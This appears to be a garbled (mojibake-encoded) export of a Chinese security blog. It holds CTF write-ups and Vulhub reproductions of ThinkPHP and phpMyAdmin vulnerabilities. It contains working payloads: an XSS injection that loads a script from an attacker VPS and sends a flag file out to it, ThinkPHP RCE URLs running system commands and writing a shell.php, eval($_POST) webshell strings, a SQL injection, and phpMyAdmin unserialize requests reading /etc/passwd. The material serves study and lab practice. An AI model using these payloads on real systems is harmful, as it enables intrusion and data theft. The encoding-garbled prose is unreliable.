å½“æˆ‘ä»¬ä¸è®¾é¢œè‰²å‚æ•°æ—¶,å°±ä¼šæˆªå–?åé¢çš„ä¸œè¥¿ä½œä¸ºkindï¼Œå¦‚æœä¸ºç©ºåˆ™kindä¸ºblackï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡æ‰“å¼€å°±æ˜¯black 12345var kind = window.location.search.substring(1); if(kind == &quot;&quot;) &#123; kind = &#x27;black&#x27;; &#125; åˆ‡æ¢é¢œè‰²è¯·æ±‚çš„æ˜¯ 1http:&#x2F;&#x2F;catweb.zajebistyc.tf&#x2F;cats?kind&#x3D; è¿”å›çš„ç»“æœéƒ½ä¼šè¢«åµŒå…¥åˆ°ç½‘é¡µä¸­ 1newDiv.innerHTML = &#x27;&lt;img style=&quot;max-width: 200px; max-height: 200px&quot; src=&quot;static/&#x27;+kind+&#x27;/&#x27;+cat+&#x27;&quot; /&gt;&#x27;; è¯•ç€å¼¹ä¸ªæ¡† 1&#x2F;?&quot;,&quot;content&quot;:[&quot;\\&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;],&quot;status&quot;:&quot;ok&quot;,&quot;a&quot;:&quot; åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œéå†äº†contentçš„å†…å®¹ çœ‹ä¸‹æ³¨å…¥åçš„æºç ï¼Œå‘ç° 1&lt;script&gt;alert(1)&lt;&#x2F;script&gt; ä»é‡Œé¢é€ƒé€¸å‡ºæ¥äº†ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬ç”¨\\&quot;&gt;å°†å‰é¢é—­åˆäº† å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹payloadè¿›è¡Œjsonæ³¨å…¥: 1&quot;, &quot;content&quot;: [&quot;\\&quot;&gt;&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;youvps.com&#x2F;xss.js&#39;&gt;&lt;&#x2F;script&gt;&quot;], &quot;status&quot;: &quot;ok&quot;, &quot;a&quot;: &quot; äº¤ç»™æœåŠ¡ç«¯ï¼Œxss.jså†™çš„æ˜¯ï¼Œåˆ©ç”¨çš„å°±æ˜¯é‚£ä¸ªCVE 1fetch(&#x27;file:///app/templates/flag.txt&#x27;).then(response =&gt; response.text()).then((response) =&gt; &#123;window.location = &#x27;https://yourvps/?a=&#x27; + (btoa(response) || &#x27;No Value&#x27;)&#125;); é¢æ¡ˆåæˆ‘ä»¬å‘æœåŠ¡ç«¯reportï¼Œå¾—åˆ°flag 1file:&#x2F;&#x2F;&#x2F;app&#x2F;templates&#x2F;index.html?&quot;, &quot;content&quot;: [&quot;\\&quot;&gt;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;yourvps&#x2F;xss.js&#39;&gt;&lt;&#x2F;script&gt;&quot;], &quot;status&quot;: &quot;ok&quot;, &quot;a&quot;: &quot; miscHidden Flagé¢˜ç›®æç¤ºflagç±»ä¼¼äºp4&#123;letters_digits_and_special_characters&#125; æ‰“å¼€é¢˜ç›®æœäº†æœå‘ç°æ˜¯Yara å‚è€ƒï¼šhttps://bbs.pediy.com/thread-226011.htm å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ä¸‹é¢çš„ 12345678rule GambitWildcard&#123; strings: $hex_string &#x3D; &#123; 70 34 7B &#125; condition: $hex_string&#125; å‘ç°åŒ¹é…åˆ°flagäº†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•çˆ†ç ´flagï¼Œè‡ªå·±å†™çš„çƒ‚exp: 1234567891011121314151617181920212223242526272829303132333435363738394041import requestsimport stringimport reimport threadingurl1=&quot;http://hidden.zajebistyc.tf/api/query/medium&quot;url2=&quot;http://hidden.zajebistyc.tf/api/matches/&#123;&#125;?offset=0&amp;limit=50&quot;proxies=&#123;&#x27;https&#x27;:&#x27;https://127.0.0.1:8080&#x27;,&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125;tr=string.ascii_letters+string.digits+string.punctuationheaders=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0&quot;,&quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;,&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,&quot;Content-Type&quot;: &quot;application/json;charset=utf-8&quot;,&quot;Origin&quot;: &quot;https://hidden.zajebistyc.tf&quot;,&quot;Connection&quot;: &quot;close&quot;,&quot;Cookie&quot;: &quot;__cfduid=ddf850d29ca9e31ba29e0e9bf15986bd01584235270&quot;&#125;flag=&quot;p4&#123;ind3x1ng-l3ak5&#125;&quot;# data=r&#x27;&#x27;&#x27;&#123;&quot;raw_yara\\&quot;:\\&quot;rule ASCIIFatTony\\\\n\\&#123;\\\\n strings:\\\\n $a = \\&#123;&#123;&#125;\\&#125;\\\\n \\\\n condition:\\\\n \\$a\\\\n\\&#125;\\&quot;,\\&quot;method\\&quot;:\\&quot;query\\&quot;&#125;&#x27;&#x27;&#x27;def getflag(s,flag): key=&#x27;&#x27; try: s1=&#x27; &#x27;+hex(ord(s)).replace(&quot;0x&quot;,&#x27;&#x27;) data1 = &#x27;&#x27;&#x27;&#123;&quot;raw_yara&quot;:&quot;rule ASCIIFatTony\\\\n&#123;\\\\n strings:\\\\n $a = &#123;70 34 7b 69 6e 64 33 78 31 6e 67 2d 6c 33 61 6b 35&#x27;&#x27;&#x27;+s1+&#x27;&#x27;&#x27;&#125;\\\\n \\\\n condition:\\\\n $a\\\\n&#125;&quot;,&quot;method&quot;:&quot;query&quot;&#125;&#x27;&#x27;&#x27; # print(data1) r=requests.post(url1,data=data1,headers=headers,proxies=proxies) key=re.match(r&quot;\\&#123;\\&quot;query_hash\\&quot;:\\&quot;(.+)\\&quot;\\&#125;&quot;,r.text).group(1) except Exception as e: pass try: url3=url2.format(key) r=requests.get(url3,headers=headers,proxies=proxies) if &quot;/opt/bin/getflag&quot; in r.text: print(&quot;[+] find!!!&quot;) flag=flag+s print(s+&quot; &quot;+hex(ord(s)).replace(&quot;0x&quot;,&#x27;&#x27;)) except Exception as e: passfor i in tr: threading.Thread(target=getflag,args=(i,flag,)).start() SuSec CTFmiscSecure noteé¢˜ç›®çš„æ„æ€æ˜¯æˆ‘ä»¬å¯ä»¥curlçš„æ”¾å¼æ¥å®Œæˆè¯·æ±‚ æˆ‘ä»¬æ‰¾åˆ°adminç”¨æˆ·ï¼ŒæŸ¥çœ‹ä»–çš„note å‘ç°å¥½åƒæ˜¯æœ‰è§„å¾‹çš„ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº†çˆ†ç ´ æˆ‘ä»¬å¯ä»¥æ„é€  1Xkva&#123;1&#125;&#123;2&#125;rqXd6tZvr&#123;3&#125; 1ä½ç½®åº”è¯¥åœ¨w-4ä¹‹é—´ï¼Œ3ä½ç½®åœ¨H-Tä¹‹é—´ï¼Œexp: 1234567891011121314151617181920212223242526272829import requestsimport stringfrom concurrent.futures import ThreadPoolExecutorproxies &#x3D; &#123; &quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;,&#125;def req(url): print(url) try: r&#x3D;requests.get(url) if r.status_code&#x3D;&#x3D;200: print(r.text) exit(0) except Exception as e: passurl&#x3D;&quot;http:&#x2F;&#x2F;69.90.132.70:1339&#x2F;paste&#x2F;Xkva&#123;&#125;&#123;&#125;rqXd6tZvr&#123;&#125;&quot;tr&#x3D;string.digits+string.ascii_lettersli&#x3D;[]for i in &#39;01234&#39;: for j in tr: for k in &#39;IJKLMNOPQRST&#39;: li.append(url.format(i,j,k))p &#x3D; ThreadPoolExecutor(3)for u in li: p.submit(req,u) æœ€åè·‘å‡ºæ¥æ˜¯ 1Xkva2arqXd6tZvrP Littleè¿™é¢˜å·®ç‚¹å°±å¼„å‡ºæ¥äº† binwalk åˆ†ç¦»å‡º secondf.png å’Œ 0.extï¼Œå¾—åˆ°tO_7h3_3nd_Of_: little.img æ–‡ä»¶ç”¨ DiskGenius æ‰“å¼€å¾—åˆ° FIRSTF.KGB å†ç”¨ KGB Archiver æå– FIRSTF.KGB å¾—åˆ° firstf.oggï¼Œæ’­æ”¾å£°éŸ³æ˜¯ c0me_wi4h_f4t_m4n_ flagåº”è¯¥è¿˜æœ‰ä¸€æ®µ ç”¨AutopsyæŸ¥çœ‹ä»¥ä¸‹åˆ é™¤çš„æ•°æ®ï¼Œæ–°å»ºä¸€ä¸ªå®ä¾‹ é€‰æ‹©å·¥ä½œç›®å½•ï¼Œéšæ„é€‰æ‹©å°±è¡Œï¼Œä¸‹ä¸€æ­¥ï¼Œç„¶åå®Œæˆ Add Data Sourceæ·»åŠ little.imgï¼Œé€‰æ‹©Unallocated Space Image File ç„¶åä¸‹ä¸€æ­¥ä¸‹ä¸€æ­¥ï¼Œå®Œæˆå°±è¡Œï¼Œçœ‹åˆ°MP4å³é”®å¯¼å‡º æ’­æ”¾å‘ç°ç¬¬ä¸‰æ®µ æ‹¼æ¥åˆ°ä¸€èµ·å°±æ˜¯ 1SUSEC&#123;c0me_wi4h_f4t_m4n_t0_7h3_3nd_0f_t4i3_sUsEc_journey&#125; å‚è€ƒï¼š http://www.gtfly.top/2020/03/16/2020-ConfidenceCTF-wp/","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"ctftime","slug":"ctftime","permalink":"http://www.m00nback.xyz/tags/ctftime/"}]},{"title":"Vulhubä¹‹thinkphp","slug":"Vulhubä¹‹thinkphp","date":"2020-03-07T15:32:14.000Z","updated":"2020-03-24T03:53:07.137Z","comments":true,"path":"2020/03/07/Vulhubä¹‹thinkphp/","link":"","permalink":"http://www.m00nback.xyz/2020/03/07/Vulhub%E4%B9%8Bthinkphp/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦å¤ç°äº†Vulhubä¸Šthinkphpç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦å¤ç°äº†Vulhubä¸Šthinkphpç›¸å…³å†…å®¹ï¼ 2.X RCEæ¼æ´åˆ†æåœ¨ThinkPHP ThinkPHP 2.xç‰ˆæœ¬ä¸­ï¼Œä½¿ç”¨preg_replaceçš„/eæ¨¡å¼åŒ¹é…è·¯ç”±ï¼š 1$res = preg_replace(&#x27;@(\\w+)&#x27;.$depr.&#x27;([^&#x27;.$depr.&#x27;\\/]+)@e&#x27;, &#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;, implode($depr,$paths)); å¯¼è‡´ç”¨æˆ·çš„è¾“å…¥å‚æ•°è¢«æ’å…¥åŒå¼•å·ä¸­æ‰§è¡Œï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚ è¯¦ç»†å†…å®¹å‚è§ï¼šhttps://www.moonback.xyz/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/ ThinkPHP 3.0ç‰ˆæœ¬å› ä¸ºLiteæ¨¡å¼ä¸‹æ²¡æœ‰ä¿®å¤è¯¥æ¼æ´ï¼Œä¹Ÿå­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚ å…ˆä»‹ç»ä¸€ä¸‹TPçš„è·¯ç”±è§„åˆ™ URLè®¿é—®æ¨¡å¼,å¯é€‰å‚æ•°0ã€1ã€2ã€3,ä»£è¡¨ä»¥ä¸‹å››ç§æ¨¡å¼ï¼š 0 (æ™®é€šæ¨¡å¼) 1 (PATHINFO æ¨¡å¼) -&gt;é»˜è®¤ä½¿ç”¨ 2 (REWRITE æ¨¡å¼) 3 (å…¼å®¹æ¨¡å¼) PATHINFO æ¨¡å¼è¿˜åˆ†ä¸º3ç§è§„åˆ™,ä½¿ç”¨æ•°å­—1ã€2ã€3ä»£è¡¨ä»¥ä¸‹ä¸‰ç§æ¨¡å¼: 1 æ™®é€šæ¨¡å¼(å‚æ•°æ²¡æœ‰é¡ºåº,ä¾‹å¦‚/m/module/a/action/id/1) 2 æ™ºèƒ½æ¨¡å¼(ç³»ç»Ÿé»˜è®¤ä½¿ç”¨çš„æ¨¡å¼ï¼Œå¯è‡ªåŠ¨è¯†åˆ«æ¨¡å—å’Œæ“ä½œ/module/action/id/1/ æˆ–è€… /module,action,id,1/â€¦) 3 å…¼å®¹æ¨¡å¼(é€šè¿‡ä¸€ä¸ªGETå˜é‡å°†PATHINFOä¼ é€’ç»™dispatherï¼Œé»˜è®¤ä¸ºsï¼Œä¾‹å¦‚index.php?s=/module/action/id/1) è¿™äº›ä¸œè¥¿åœ¨ThinkPHP/Common/convention.phpä¸­å®šä¹‰çš„æœ‰ æ¼æ´å‡ºç°çš„ä½ç½®ä½äºThinkPHP/Lib/Think/UtilDispatcher.class.php æ¼æ´å¤ç°æˆ‘ä»¬å¯ä»¥æ„é€ æ²¡æœ‰çš„è·¯ç”±è§„åˆ™æ¥rce 123?s=a/b/c/$&#123;phpinfo()&#125;s=a/b/c/$&#123;eval($_POST[1])&#125;?s=a/b/c/$&#123;@print(eval($_POST[1]))&#125; 5.0.23 RCEæ¼æ´åˆ†æç”±äºæ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ çš„äº§ç”Ÿã€‚ æ¼æ´å½±å“ç‰ˆæœ¬ï¼š 5.0.0&lt;=ThinkPHP5&lt;=5.0.23 ã€5.1.0&lt;=ThinkPHP&lt;=5.1.30 æ¼æ´ä½äºthinkphp/library/think/Request.php å¯ä»¥çœ‹åˆ°é€šè¿‡å¤–éƒ¨ä¼ å…¥Config::get(&#39;var_method&#39;)å¯ä»¥é€ æˆè¯¥ç±»çš„ä»»æ„æ–¹æ³•è°ƒç”¨ è¿™é‡Œæˆ‘ä»¬åˆå¯ä»¥å°†ç±»å±æ€§è¿›è¡Œæ›¿æ¢ å•Š å¤ªéš¾äº† å…ˆæŒ–å¥½å‘ï¼ã€‚ã€‚ã€‚ã€‚ã€‚ æ¼æ´å¤ç°æˆ‘ä»¬æœ€ç»ˆæ„é€ çš„payload: 12345678http://127.0.0.1/index.php?s=captcha#å‘½ä»¤æ‰§è¡ŒPOST1ï¼š_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoamiPOST2ï¼š_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami#ä»»æ„æ–‡ä»¶åŒ…å«POST: _method=__construct&amp;method=get&amp;filter[]=think\\__include_file&amp;server[]=phpinfo&amp;get[]=/etc/passwd å‘½ä»¤æ‰§è¡Œ1ï¼š å‘½ä»¤æ‰§è¡Œ2ï¼š ä»»æ„æ–‡ä»¶è¯»å–ï¼š 5-rceæ¼æ´åˆ†æ å½±å“èŒƒå›´ 5.x &lt; 5.1.315.x &lt;= 5.0.23 æ¼æ´ç‚¹åœ¨library/think/route/dispatch/Module.php ç•™ä¸ªå‘ æ¼æ´å¤ç°5.1.x phpç‰ˆæœ¬&gt;5.5 12345http://127.0.0.1/index.php?s=index/think\\request/input?data[]=phpinfo()&amp;filter=asserthttp://127.0.0.1/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()http://127.0.0.1/index.php?s=index/\\think\\template\\driver\\file/write?cacheFile=shell.php&amp;content=&lt;?php%20phpinfo();?&gt; 5.0.x phpç‰ˆæœ¬&gt;=5.4 12http://127.0.0.1/index.php?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://your-ip:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 12345678910111213app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami/thinkphp/public/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir/thinkphp/public/?s=index/\\think\\app/invokefunction&amp;function=phpinfo&amp;vars[0]=1/thinkphp/public/?s=index/\\think\\app/invokefunction&amp;function=system&amp;vars=dir/thinkphp/public/?s=index/\\think\\app/invokefunction&amp;function=system&amp;return_value=&amp;command=dir/thinkphp/public/?s=index/\\think\\app/invokefunction&amp;function=system&amp;vars[0]=dir&amp;vars[1][]=/thinkphp/public/index.php?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt; in-sqlinjectionæ¼æ´åˆ†æè¦æ±‚è¦å¼€å¯DEBUGæ¨¡å¼ Tpå®˜æ–¹ç‰ˆæœ¬5.0.9é»˜è®¤ä¾æ—§æ˜¯å¼€æ”¾ç€è°ƒè¯•æ¨¡å¼ æ¼æ´å¤ç°å¯ä»¥çˆ†å‡ºæ•°æ®åº“è´¦å·å¯†ç  1/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 å‚è€ƒï¼š https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/ https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ https://xz.aliyun.com/t/3845 https://xz.aliyun.com/t/3570 https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/ https://xz.aliyun.com/t/125","categories":[],"tags":[{"name":"å¤ç°","slug":"å¤ç°","permalink":"http://www.m00nback.xyz/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"thinkphp","slug":"thinkphp","permalink":"http://www.m00nback.xyz/tags/thinkphp/"},{"name":"vulhub","slug":"vulhub","permalink":"http://www.m00nback.xyz/tags/vulhub/"}]},{"title":"Vulhubä¹‹phpmyadmin","slug":"Vulhubä¹‹phpmyadmin","date":"2020-03-07T15:32:03.000Z","updated":"2020-03-09T03:35:25.234Z","comments":true,"path":"2020/03/07/Vulhubä¹‹phpmyadmin/","link":"","permalink":"http://www.m00nback.xyz/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†Vulhubä¸Šphpmyadminæ¼æ´çš„ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†Vulhubä¸Šphpmyadminæ¼æ´çš„ç›¸å…³å†…å®¹ï¼ CVE-2018-12613æ¼æ´ç®€ä»‹å·²ç™»å½•çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åŒ…å«ä»»æ„æ–‡ä»¶æ¥è¯»å–å†…å®¹ï¼Œè¿›ä¸€æ­¥å¯ä»¥åŒ…å«sessionæ¥getshell å½±å“èŒƒå›´phpmyadminç‰ˆæœ¬ï¼š4.8.0å’Œ4.8.1å—åˆ°å½±å“ æ¼æ´å¤ç°å¤ç°è¿‡ç¨‹ï¼šhttps://www.moonback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/#CVE-2018-12613å¤ç° CVE-2016-5734æ¼æ´ç®€ä»‹phpMyAdminæ˜¯ä¸€å¥—å¼€æºçš„ã€åŸºäºWebçš„MySQLæ•°æ®åº“ç®¡ç†å·¥å…·ã€‚åœ¨å…¶æŸ¥æ‰¾å¹¶æ›¿æ¢å­—ç¬¦ä¸²åŠŸèƒ½ä¸­ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯æ‹¼æ¥è¿›preg_replaceå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ä¸­ã€‚ åœ¨PHP5.4.7ä»¥å‰ï¼Œpreg_replaceçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥åˆ©ç”¨\\0è¿›è¡Œæˆªæ–­ï¼Œå¹¶å°†æ­£åˆ™æ¨¡å¼ä¿®æ”¹ä¸ºeã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œeæ¨¡å¼çš„æ­£åˆ™æ”¯æŒæ‰§è¡Œä»£ç ï¼Œæ­¤å·²ç™»å½•çš„æ”»å‡»è€…ä¾¿å¯æ„é€ ä¸€ä¸ªä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚ å½±å“èŒƒå›´ 4.0.10.16ä¹‹å‰4.0.xç‰ˆæœ¬ 4.4.15.7ä¹‹å‰4.4.xç‰ˆæœ¬ 4.6.3ä¹‹å‰4.6.xç‰ˆæœ¬ï¼ˆå®é™…ä¸Šç”±äºè¯¥ç‰ˆæœ¬è¦æ±‚PHP5.5+ï¼Œæ‰€ä»¥æ— æ³•å¤ç°æœ¬æ¼æ´ï¼‰ æ¼æ´å¤ç°exp(python2)åœ°å€ï¼šhttps://www.exploit-db.com/exploits/40185 è¿™é‡Œä¸‹è½½çš„æ˜¯4.4.15.6ç‰ˆæœ¬ï¼Œå†å²ä¸‹è½½ç‰ˆæœ¬ï¼šhttps://www.phpmyadmin.net/files/ tbl_find_replace.phpçš„24è¡Œä¸­ï¼Œå°†POSTçš„findå’ŒreplaceWwithä¼ å…¥åˆ°äº†$table_searchçš„getReplacePreviewæ–¹æ³•ä¸­ $table_searchæ˜¯PMA_TableSearchå¯¹è±¡å®ä¾‹åŒ–çš„ç»“æœ,è€ŒPMA_TableSearchåœ¨libraries/TableSearch.class.phpä¸­è¿›è¡Œäº†å®šä¹‰ï¼Œæˆ‘ä»¬å®šä½åˆ°libraries/TableSearch.class.phpçš„1430è¡Œ åœ¨getReplacePreviewæ–¹æ³•ä¸­ï¼Œç”±äºexpä¸­è®¾å®šäº†$useRegexçš„å€¼ï¼Œæ‰€ä»¥å‚æ•°ç»§ç»­ä¼ é€’åˆ°_getRegexReplaceRowsæ–¹æ³•ä¸­ï¼Œå®šä½åˆ°1388è¡Œ åœ¨1408~1413è¡Œå½“ä¸­ï¼Œpreg_replace(&quot;/&quot; . $find . &quot;/&quot;, $replaceWith, $row[0]);å¾ˆç»å…¸åœ°è¿˜åŸäº†55856 Bugçš„åœºæ™¯ï¼Œexpä¸­é€šè¿‡ &quot;find&quot;: &quot;0/e\\0&quot;,&quot;replaceWith&quot;: payload,çš„POSTæäº¤ï¼Œç©ºå­—èŠ‚æˆªæ–­å¹¶ä¼ å…¥eä¿®é¥°ç¬¦è¿›è€Œæ‰§è¡Œæˆ‘ä»¬çš„payloadï¼Œä¹Ÿå°†æ›¿æ¢çš„ç»“æœè¿›è¡Œäº†å›ä¼ ï¼Œæœ€ç»ˆçš„å¤ç°å¦‚ä¸‹ï¼š WooYun-2016-199433æ¼æ´ç®€ä»‹phpmyadmin 2.xç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€å¤„ååºåˆ—åŒ–æ¼æ´ï¼Œè¯¥æ¼æ´æ— éœ€è®¤è¯ç™»é™†ï¼Œé€šè¿‡è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚ æ¼æ´èŒƒå›´phpmyadmin:2.X(å…·ä½“ç‰ˆæœ¬ä¸æ¸…æ¥šï¼Œæµ‹è¯•ç”¨çš„æ˜¯2.8.0.4) æ¼æ´å¤ç°åœ¨scripts/setup.phpä¸­ï¼Œå­˜åœ¨è¾“å…¥å˜é‡configuration,è¯¥å˜é‡ä¼šè¢«unserializeå‡½æ•°è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼š å½“é€šè¿‡è¯¥è¾“å…¥ç‚¹ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œä¼šç»ååºåˆ—åŒ–å‡ºæ¥ä¸€ä¸ªå¯¹è±¡ã€‚åœ¨è¿™ä¸ªå¯¹è±¡ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨è§¦å‘æŸäº›é­”æ³•å‡½æ•°ã€‚ scripts/setup.phpé€šè¿‡require_onceå‡½æ•°å¼•å…¥äº†librarise/common.lib.phpæ–‡ä»¶ è€Œlibrarise/common.lib.phpåˆå¼•å…¥äº†librarise/Config.class.php åœ¨librarise/Config.class.phpä¸­å­˜åœ¨é­”æ³•å‡½æ•°__wakeupï¼Œè¯¥é­”æ³•å‡½æ•°åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åç«‹å³è¢«è§¦å‘è°ƒç”¨ï¼š å¯ä»¥çœ‹åˆ°ï¼Œå…¶å†…åœ¨æ»¡è¶³æ¡ä»¶åï¼Œä¼šè°ƒç”¨load()å‡½æ•°ã€‚ç»§ç»­è·Ÿè¸ªload()å‡½æ•°ï¼š å½“æ£€æµ‹åˆ°file_get_contentsè¢«å®šä¹‰ï¼Œåˆ™é€šè¿‡evalå‡½æ•°æ‰§è¡Œè¯»å…¥çš„å­—ç¬¦ä¸²ï¼›å¦‚æœæ²¡æœ‰file_get_contentså‡½æ•°ï¼Œåˆ™é€šè¿‡fileè¯»å…¥æ–‡ä»¶ï¼ŒåŒæ—¶åˆ©ç”¨implodeå‡½æ•°æŠŠæ–‡ä»¶å†…å®¹åˆ©ç”¨\\næ‹¼æ¥ï¼Œå†æ‰§è¡Œevalå‡½æ•°ã€‚ æ•´ä½“æ€è·¯ï¼šphp 1setup.php-&gt;common.lib.php-&gt;Config.class.php-&gt;__wakeup()-&gt;load()-&gt;eval(); æ¥ä¸‹æ¥å°±æ˜¯å›é¡¾è·Ÿè¸ªéœ€è¦æ»¡è¶³çš„å­—æ®µå’Œæ„é€ ç‰¹å®šçš„åºåˆ—åŒ–æ•°æ®ï¼š åœ¨è¾“å…¥ç‚¹ä½ç½®setup.phpä¸­ï¼Œéœ€è¦å…·å¤‡2ä¸ªä¼ å‚å­—æ®µactionå’Œconfigurationï¼ŒåŒæ—¶åˆ›å»ºäº†$PMA_Config = new PMA_Config(); è€Œåœ¨æ§åˆ¶ç‚¹çš„loadå‡½æ•°ä¸­ï¼Œåˆ™åªéœ€è¦ä¼ å…¥å½¢å‚sourceå’Œå¯¹åº”çš„ç‰¹å®šæ•°æ®å³å¯ã€‚ 1234567&lt;?phpclass PMA_Config&#123; public $source = &#x27;/etc/passwd&#x27;;&#125;$a = new PMA_Config();echo serialize($a); æˆ‘ä»¬å°±å¯ä»¥è¯»æ–‡ä»¶äº† 1234567891011POST /scripts/setup.php HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 80action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125; è¿˜æœ‰ä¸ªæ›´ç®€å•çš„exp: 12345678910111213141516171819&lt;?phpclass PMA_Config&#123;public $source;&#125;$t = new PMA_Config();$t -&gt; source = $_GET[&#x27;file&#x27;];$str = serialize($t);$url = $_GET[&#x27;url&#x27;];$data = &quot;configuration=&quot;.$str.&quot;&amp;action=test&quot;;echo $data;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch, CURLOPT_HEADER, false);curl_setopt($ch, CURLOPT_POST,true);curl_setopt($ch, CURLOPT_POSTFIELDS, $data);curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);echo curl_exec($ch); ?&gt; Getshell åˆ©ç”¨æ–¹å¼ä¸€ ä½†æ˜¯ç»è¿‡åˆ†æè¿™ä¸ªæ¼æ´æ˜¯ä¸èƒ½è¯»å–phpæ–‡ä»¶çš„ï¼Œå› ä¸ºæœ‰äº†eval()ï¼Œç›¸å½“äºä»»æ„æ–‡ä»¶åŒ…å«äº†ï¼Œä¸è¿‡å¦ä¸€æ–¹é¢è¿™ä¹Ÿæ˜¯æœ‰å¥½å¤„çš„ï¼Œå¦‚æœèƒ½å†™å…¥æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­åŒ…å«ä¸€ä¸ªä¸€å¥è¯å°±å¯ä»¥ç›´æ¥getshelläº†ã€‚ä½œè€…ç»™çš„æ–¹å¼æ˜¯ç”¨error logã€‚ æ ¹æ®ä½œè€…çš„æ–¹æ³•ï¼Œä½¿ç”¨é»˜è®¤ç¯å¢ƒï¼Œæ‰å‘ç°æœ‰ç‚¹é¸¡è‚‹ï¼Œæ¯”å¦‚ï¼Œåœ¨ubuntuä¸‹ï¼Œä¸€èˆ¬æ˜¯ä¸å…è®¸ç”¨rootæƒé™è¿è¡Œï¼Œå®é™…æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬æ˜¯æ— 